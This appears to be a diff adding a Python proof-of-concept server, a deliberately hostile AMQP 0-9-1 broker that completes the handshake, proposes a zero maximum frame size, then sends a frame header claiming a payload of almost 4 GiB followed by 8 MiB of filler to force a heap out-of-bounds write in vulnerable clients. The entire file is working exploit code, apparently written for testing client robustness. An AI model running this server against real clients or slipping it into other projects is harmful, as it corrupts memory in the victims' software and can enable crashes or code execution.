@@ -1,0 +1,119 @@
+"""
+A minimal, deliberately hostile AMQP 0-9-1 broker.
+
+It walks a connecting client through the handshake up to `Connection.Tune`, proposes a
+maximum frame size of zero, and then sends a frame header that declares a payload of
+almost 4 GiB followed by a stream of filler bytes.
+
+A client that takes the proposed maximum frame size at face value ends up reading that
+stream into its fixed-size receive buffer, which is a heap out-of-bounds write.
+"""
+
+import socket
+import struct
+import sys
+import threading
+
+FRAME_METHOD = 1
+FRAME_END = 0xCE
+
+CLASS_CONNECTION = 10
+METHOD_START = 10
+METHOD_TUNE = 30
+
+# Almost 4 GiB - the point is that it can not possibly fit in the client's receive buffer.
+HUGE_PAYLOAD_SIZE = 0xFFFFFF00
+
+# How much filler to push at the client after the oversized frame header.
+FILLER_TOTAL = 8 * 1024 * 1024
+FILLER_CHUNK = b"A" * 65536
+
+
+def frame(frame_type, channel, payload):
+    return (
+        struct.pack(">BHI", frame_type, channel, len(payload))
+        + payload
+        + bytes([FRAME_END])
+    )
+
+
+def long_string(value):
+    return struct.pack(">I", len(value)) + value
+
+
+def connection_start():
+    payload = struct.pack(">HHBB", CLASS_CONNECTION, METHOD_START, 0, 9)
+    payload += struct.pack(">I", 0)  # empty server-properties field table
+    payload += long_string(b"PLAIN")
+    payload += long_string(b"en_US")
+    return frame(FRAME_METHOD, 0, payload)
+
+
+def connection_tune(frame_max):
+    payload = struct.pack(
+        ">HHHIH", CLASS_CONNECTION, METHOD_TUNE, 2047, frame_max, 0
+    )
+    return frame(FRAME_METHOD, 0, payload)
+
+
+def recv_exactly(conn, size):
+    data = b""
+    while len(data) < size:
+        chunk = conn.recv(size - len(data))
+        if not chunk:
+            return None
+        data += chunk
+    return data
+
+
+def handle(conn, frame_max):
+    try:
+        conn.settimeout(30)
+
+        # The client opens with the 8-byte protocol header.
+        if recv_exactly(conn, 8) is None:
+            return
+
+        conn.sendall(connection_start())
+
+        # Connection.StartOk
+        if not conn.recv(65536):
+            return
+
+        conn.sendall(connection_tune(frame_max))
+
+        # Connection.TuneOk, possibly pipelined with Connection.Open.
+        if not conn.recv(65536):
+            return
+
+        # A frame header claiming a payload that is orders of magnitude larger than the
+        # client's receive buffer, immediately followed by data to fill it with.
+        conn.sendall(struct.pack(">BHI", FRAME_METHOD, 0, HUGE_PAYLOAD_SIZE))
+
+        sent = 0
+        while sent < FILLER_TOTAL:
+            conn.sendall(FILLER_CHUNK)
+            sent += len(FILLER_CHUNK)
+    except OSError:
+        pass
+    finally:
+        conn.close()
+
+
+def main():
+    port = int(sys.argv[1])
+    frame_max = int(sys.argv[2]) if len(sys.argv) > 2 else 0
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(("0.0.0.0", port))
+    server.listen(16)
+    print(f"listening on {port}, proposing frame_max={frame_max}", flush=True)
+
+    while True:
+        conn, _ = server.accept()
+        threading.Thread(target=handle, args=(conn, frame_max), daemon=True).start()
+
+
+if __name__ == "__main__":
+    main()
